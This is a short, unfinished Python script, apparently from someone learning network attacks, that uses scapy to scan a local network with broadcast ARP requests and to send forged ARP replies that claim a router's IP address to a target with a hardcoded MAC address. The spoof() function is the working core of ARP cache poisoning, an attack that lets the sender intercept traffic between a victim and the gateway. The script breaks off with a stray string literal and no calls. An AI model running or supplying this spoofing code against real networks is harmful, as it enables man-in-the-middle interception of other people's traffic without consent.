#!/usr/bin/env python3
import scapy.all as scapy

scapy.ls(scapy.ARP) #in terminal
#pdst is the ip of the target computer
#hwdst mac of target
#psrc is ip of router
#op 2 is response, instead of request


def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # arp_request_broadcast.show()
    # answered_list, unanswsered_list = scapy.srp(arp_request_broadcast, timeout=1)
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #tells it to return only 1st item returned which is the answered list
    # print(answered_list.summary())


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="08:00:27:4d:08:65", psrc=spoof_ip)
    scapy.send(packet)
    "10.0.2.1 "